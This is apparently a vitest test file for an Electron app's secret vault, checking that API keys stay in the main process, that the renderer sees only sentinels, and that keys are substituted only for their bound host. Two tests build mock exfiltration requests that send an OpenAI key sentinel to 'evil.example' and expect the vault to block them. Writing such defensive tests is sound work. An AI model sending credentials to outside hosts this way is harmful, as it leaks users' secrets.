/** Round 3 · A6: secrets stay in main; renderer gets sentinels; substitution only for the bound host */
import { describe, it, expect } from 'vitest'
import { redactForRenderer, mergeFromRenderer, setSecret, resolveRequest, resolveInText, stashBackupSecrets, bindHosts, sentinelFor, isSentinel } from '../electron/vault'
import { defaultSettings } from '../src/shared/storage'

const plain = () => {
  const s: any = defaultSettings()
  s.providers = s.providers.map((p: any) => p.id === 'openai' ? { ...p, apiKey: 'sk-real-openai' } : p.id === 'gemini' ? { ...p, apiKey: 'AIza-real' } : p)
  s.webdav = { url: 'https://dav.example.com/remote.php/dav', username: 'me', password: 'dav-pass', enabled: true }
  s.webSearch = { ...s.webSearch, tavilyKey: 'tvly-real' }
  return s
}
describe('vault', () => {
  it('renderer copy contains no secret, only sentinels', () => {
    const r = redactForRenderer(plain())
    const txt = JSON.stringify(r)
    for (const k of ['sk-real-openai', 'AIza-real', 'dav-pass', 'tvly-real']) expect(txt).not.toContain(k)
    expect(isSentinel(r.providers[0].apiKey)).toBe(true); expect(r.providers[1].apiKey).toBe('')
  })
  it('merge keeps stored secrets for sentinels / empty; another slot\'s sentinel cannot move a key', () => {
    const p = plain(), meta = bindHosts(p)
    const r = structuredClone(redactForRenderer(p)) // the renderer works on a copy (IPC)
    r.providers[1].apiKey = r.providers[0].apiKey // try to copy openai key to anthropic
    r.providers[0].baseURL = 'https://api.openai.com/v1'
    const m = mergeFromRenderer(r, p, new Map(), meta)
    expect(m.settings.providers[0].apiKey).toBe('sk-real-openai'); expect(m.settings.providers[1].apiKey).toBe('')
    expect(m.settings.webdav.password).toBe('dav-pass')
  })
  it('requests: substituted in header / URL / Basic auth / JSON body only for the bound host', () => {
    const p = plain(), meta = bindHosts(p)
    const s = (path: string) => sentinelFor(path)
    const a = resolveRequest({ url: 'https://api.openai.com/v1/chat/completions', headers: { Authorization: `Bearer ${s('providers/openai/apiKey')}` }, body: '{}' }, p, meta)
    expect(a.req.headers!.Authorization).toBe('Bearer sk-real-openai'); expect(a.error).toBeUndefined()
    const g = resolveRequest({ url: `https://generativelanguage.googleapis.com/v1beta/models/x:streamGenerateContent?alt=sse&key=${s('providers/gemini/apiKey')}` }, p, meta)
    expect(g.req.url).toContain('key=AIza-real')
    const basic = 'Basic ' + Buffer.from(`me:${s('webdav/password')}`).toString('base64')
    const w = resolveRequest({ url: 'https://dav.example.com/remote.php/dav/x', headers: { Authorization: basic } }, p, meta)
    expect(Buffer.from(w.req.headers!.Authorization.slice(6), 'base64').toString()).toBe('me:dav-pass')
    const tv = resolveRequest({ url: 'https://api.tavily.com/search', body: JSON.stringify({ api_key: s('webSearch/tavilyKey') }) }, p, meta)
    expect(JSON.parse(tv.req.body!).api_key).toBe('tvly-real')
    // exfiltration attempt: openai key to another host
    const evil = resolveRequest({ url: 'https://evil.example/collect', headers: { Authorization: `Bearer ${s('providers/openai/apiKey')}` } }, p, meta)
    expect(evil.error).toMatch(/bound to api.openai.com/); expect(JSON.stringify(evil.req)).not.toContain('sk-real-openai')
  })
  it('changing a provider URL to another host does not carry the key along', () => {
    const p = plain(), meta = bindHosts(p)
    const r = structuredClone(redactForRenderer(p)); r.providers[0].baseURL = 'https://evil.example/v1'
    const m = mergeFromRenderer(r, p, new Map(), meta)
    const x = resolveRequest({ url: 'https://evil.example/v1/models', headers: { Authorization: `Bearer ${sentinelFor('providers/openai/apiKey')}` } }, m.settings, m.meta)
    expect(x.error).toBeTruthy()
    // re-entering the key binds it to the new host
    const ss = setSecret(m.settings, m.meta, 'providers/openai/apiKey', 'sk-new')
    expect(resolveRequest({ url: 'https://evil.example/v1/models', headers: { Authorization: `Bearer ${ss.sentinel}` } }, ss.settings, ss.meta).req.headers!.Authorization).toBe('Bearer sk-new')
  })
  it('backup with keys is resolved by main; restoring stashes keys and the renderer only sees import sentinels', () => {
    const p = plain()
    const backup = JSON.stringify({ format: 'tidequill-backup', version: 1, data: { settings: redactForRenderer(p) } })
    const file = resolveInText(backup, p)
    expect(file).toContain('sk-real-openai'); expect(file).toContain('dav-pass')
    const stash = new Map<string, string>()
    const seen = stashBackupSecrets(file, stash)
    expect(seen).not.toContain('sk-real-openai'); expect(stash.size).toBe(4)
    const incoming = JSON.parse(seen).data.settings
    const m = mergeFromRenderer(incoming, defaultSettings(), stash, { hosts: {} })
    expect(m.settings.providers[0].apiKey).toBe('sk-real-openai'); expect(m.meta.hosts['providers/openai/apiKey']).toBe('api.openai.com')
  })
})
